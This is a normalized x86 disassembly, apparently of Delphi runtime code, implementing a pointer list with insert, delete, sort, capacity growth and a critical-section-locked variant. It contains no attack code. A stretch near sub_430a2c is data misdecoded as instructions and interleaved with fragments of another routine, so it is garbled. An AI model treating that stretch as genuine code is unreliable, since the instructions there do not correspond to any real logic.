pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov ebx eax
call sub_40a7e8
mov [ eax + 0x10 ] ebx
sub_42fff4
push ebx
push esi
push edi
call sub_40a7e8
mov edi [ eax + 0xc ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4305a0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_430024
push ebx
push esi
call sub_40a7e8
mov eax [ eax + 0xc ]
call sub_4055f0
call sub_40a7e8
mov ebx [ eax + 0x10 ]
mov eax ebx
call sub_4306d0
mov esi eax
call sub_40a7e8
mov [ eax + 0xc ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_430438
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_40a7e8
xor edx edx
mov [ eax + 0x10 ] edx
mov eax ebx
call sub_4055f0
sub_430080
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4300fc
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430103
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40557c
call sub_430080
pop ecx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4054c8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4089c0
call sub_408a10
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_42ff18
or bl al
sub_43010c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_4301b9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_43019a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax edx
push ebp
call sub_430080
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_42ff9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301a1
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_42fff4
retn
call sub_430024
sub_4301d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cf0
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_43022d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_438b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430234
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_43023c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov edx [ ebx ]
mov eax edx
mov ecx [ esi ]
mov edx ecx
cmp edx eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_431a9c
push eax
mov eax esi
call sub_431a9c
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_430341
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4301d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_430324
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4301d0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_410f30
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43032b
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov al 0x1
sub_430358
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] 0xffffffff
mov [ edi + 0x8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4303c0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4303e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_430438
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4043c8
mov eax [ ebx + 0x4 ]
mov edi [ eax + esi * 4 ]
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4304a4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4304a0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
jmp sub_4060b0
sub_4304dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_430524
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40a204
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4304a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43052b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_430530
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax [ ebx ]
call sub_4304dc
cmp edi [ ebx + 0x8 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ eax + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov ecx [ ecx + edi * 4 ]
mov [ eax + esi * 4 ] ecx
mov [ eax + edi * 4 ] edx
pop edi
pop esi
pop ebx
retn
sub_4305a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jb r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
sub_4305d4
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_430844
retn
sub_430608
push esi
mov ecx [ eax + 0x8 ]
mov esi [ eax + 0x4 ]
mov eax ecx
dec eax
test eax eax
jl r-xdata
or ecx 0xffffffff
inc eax
xor ecx ecx
mov eax ecx
pop esi
retn
inc ecx
dec eax
jne r-xdata
cmp edx [ esi + ecx * 4 ]
je r-xdata
sub_43062c
push ebx
test cl cl
jne r-xdata
mov ebx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov eax ebx
dec eax
cmp eax 0x0
jl r-xdata
call sub_430608
jmp r-xdata
or eax 0xffffffff
cmp edx [ ecx + eax * 4 ]
je r-xdata
pop ebx
retn
dec eax
cmp eax 0xffffffff
jne r-xdata
sub_430658
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4043c8
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4306f4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4305a0
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_430438
xor ecx ecx
mov edx esi
mov eax ebx
call sub_430658
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_43074c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax + esi * 4 ] edi
mov ecx [ ebx ]
mov eax ecx
cmp eax [ r-xdata ]
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ eax + esi * 4 ]
cmp edi edx
je r-xdata
test edx edx
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4307b0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43062c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_430438
sub_4307d0
push ebx
push esi
push edi
push ebp
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebp ebp
xor ebx ebx
jmp r-xdata
cmp ebx [ esi + 0x8 ]
jge r-xdata
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + ebx * 4 ] 0x0
je r-xdata
cmp ebx [ esi + 0x8 ]
jl r-xdata
mov edi ebx
jmp r-xdata
inc ebx
mov [ esi + 0x8 ] ebp
cmp edi [ esi + 0x8 ]
jge r-xdata
dec edi
cmp ebp ebx
jge r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + edi * 4 ] 0x0
jne r-xdata
mov eax edi
sub eax ebx
inc eax
add ebp eax
lea ebx [ edi + 0x1 ]
mov eax [ esi + 0x4 ]
lea edx [ eax + ebp * 4 ]
mov eax edi
sub eax ebx
inc eax
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ esi + 0x4 ]
lea eax [ eax + ebx * 4 ]
call sub_4043c8
inc edi
sub_430844
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_404238
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_430880
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4304dc
cmp esi 0x7ffffff
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jle r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_430844
mov ecx [ ebx ]
mov edx ecx
cmp edx [ r-xdata ]
je r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_404c14
jmp r-xdata
mov [ ebx + 0x8 ] esi
dec eax
mov edx esi
sub edx eax
jg r-xdata
dec edx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
dec [ esp ]
inc [ esp + 0x4 ]
jne r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
test eax eax
je r-xdata
sub_430924
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
call sub_409d28
xor eax eax
push ebp
push sub_4309f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp esi ebx
je r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
inc ebx
dec esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + ebx * 4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + esi * 4 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + ebx * 4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + esi * 4 ] eax
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430924
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4309f8
lea eax [ ebp + 0x8 ]
call sub_409cb4
retn
sub_430a2c
or eax 0x1700430a
or al [ ebx ]
and [ edx ] ecx
inc ebx
add [ 0x100430a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] ch
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0xa3c0043 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
or al [ ebx ]
mov ah 0xa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh cl
or al [ ebx ]
sbb [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al 0x40
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 + 0x55e00040 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
mov ah 0x51
inc edx
add [ eax + eax ] cl
add [ eax ] al
pop es
inc ebx
outsd
insd
jo r-xdata
xor eax eax
push ebp
push sub_430b92
push [ fs : eax ]
jb r-xdata
call sub_409ccc
mov [ esi + 0xc ] edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
sub edx 0xfffffff8
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
lea eax [ ebp - 0x4 ]
inc ebx
add [ edi + edi * 8 + 0x30 ] ah
add al [ eax ]
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
xor eax eax
cmp [ ebx + 0x8 ] 0x1
jle r-xdata
mov edx esi
test edx edx
je r-xdata
inc ebp
cld
push ebx
outsd
jb r-xdata
test esi esi
je r-xdata
shl [ ebx + eax - 0x7d ] cl
0x9173e8f8 0xfffd
and al 0x41
arpl [ edx + edx * 2 + 0x65 ] si
arpl [ ebp + 0xae80040 ] cx
inc ebx
add [ edi ] al
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
push esi
mov ecx [ ebx + 0x8 ]
dec ecx
xor edx edx
call sub_430924
sub esi 0xfffffff0
push ebx
outsd
jb r-xdata
adc eax [ ebp - 0x7cfc8b0a ]
out dx al
and al 0x41
arpl [ edx + edx * 2 + 0x65 ] si
arpl [ edx + ecx + 0x1dd40043 ] si
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b99
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
jae r-xdata
add [ eax ] al
add [ edx ] al
add [ eax - 0x742774ad ] dl
retn 0xd18b
sub_430b20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_430b92
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
lea eax [ ebp - 0x4 ]
mov edx esi
test edx edx
je r-xdata
call sub_409ccc
mov [ esi + 0xc ] edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
sub edx 0xfffffff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b99
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
cmp [ ebx + 0x8 ] 0x1
jle r-xdata
test esi esi
je r-xdata
push esi
mov ecx [ ebx + 0x8 ]
dec ecx
xor edx edx
call sub_430924
sub esi 0xfffffff0
sub_430ba0
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
cmp [ eax + 0x8 ] 0x1
jle r-xdata
push edx
mov edx [ eax + 0x8 ]
dec edx
mov eax ecx
xor ecx ecx
xchg ecx edx
call sub_430924
sub_430bc8
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov ebx eax
xor esi esi
movzx ecx [ esp ]
mov edx edi
mov eax ebx
call sub_43062c
test eax eax
jl r-xdata
mov eax esi
pop edx
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_430438
mov edx [ ebx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_430c1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov edi eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_430c1c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_430c5b ]
movzx eax bl
cmp eax 0x5
ja r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ edi + 0xc ]
mov eax esi
call sub_430844
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_430e15
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_430844
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_430ed5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_430844
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4305a0
mov edx eax
mov eax edi
call sub_430608
inc eax
jne r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4305a0
mov edx eax
mov eax edi
call sub_430608
inc eax
je r-xdata
push 0x0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_430c1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax esi
call sub_430608
inc eax
jne r-xdata
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax esi
call sub_4303e0
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_430438
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax esi
call sub_4303e0
mov ebx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
add ebx [ eax + 0x8 ]
cmp ebx [ esi + 0xc ]
jle r-xdata
mov edx ebx
mov eax esi
call sub_4305a0
mov edx eax
mov eax edi
call sub_430608
inc eax
je r-xdata
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4303e0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_430438
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4303e0
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax esi
call sub_430608
inc eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx ebx
mov eax esi
call sub_430844
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_430438
mov edx ebx
mov eax edi
call sub_4305a0
mov edx eax
mov eax esi
call sub_430608
inc eax
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov edx eax
mov eax esi
call sub_4303e0
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
sub_430ee8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_430f3c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_405bb4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431088
xor eax eax
push ebp
push sub_430f9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4055f0
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4055e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430fa6
mov eax [ ebp - 0x4 ]
call sub_4310f8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_430fb8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431088
xor eax eax
push ebp
push sub_431034
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4303e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_430608
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43103b
mov eax [ ebp - 0x4 ]
call sub_4310f8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4304dc
sub_431040
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_431088
xor eax eax
push ebp
push sub_43107e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431085
